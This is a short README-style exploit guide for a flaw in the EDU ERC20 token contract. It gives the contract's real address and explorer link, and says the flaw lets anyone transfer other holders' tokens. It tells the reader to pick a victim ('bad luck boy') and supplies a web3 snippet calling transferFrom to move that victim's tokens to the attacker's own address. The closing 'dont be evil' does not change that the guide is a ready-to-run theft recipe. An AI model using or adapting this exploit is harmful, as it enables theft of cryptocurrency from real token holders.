# erc20_token_crack
a doc for erc20 token crack

# 0x00
some days ago, i got a erc20 contract security problom in EDU

- contract address: 0xa0872eE815B8dd0F6937386Fd77134720d953581
- explorer: https://etherscan.io/address/0xa0872eE815B8dd0F6937386Fd77134720d953581

in this case, we can tranfer anyone's EDU without permission.
this is the bug look:

[![CfRvQ0.md.jpg](https://s1.ax1x.com/2018/05/26/CfRvQ0.md.jpg)](https://imgchr.com/i/CfRvQ0)

eth picture is from ..., i forgot. Please commit a issue if you know where the picture from, thank you

So, lets bigin the game

# 0x01
what we need first

- a eth server with a geth or web3 client that we can send transaction
- a eth address

＃ 0x02
seek a bad luck boy

# 0x03

    # add abi
    abi = {edu_abi} # replace with edu abi
    edu_contract = web3.eth.contract(abi).at('0xa0872eE815B8dd0F6937386Fd77134720d953581')
    edu_contract.transferFrom('the bad luck boy', eth.coinbase, 10, {'from': eth.coinbase})
  
# 0x04
 here we finished, at last, dont be evil :)



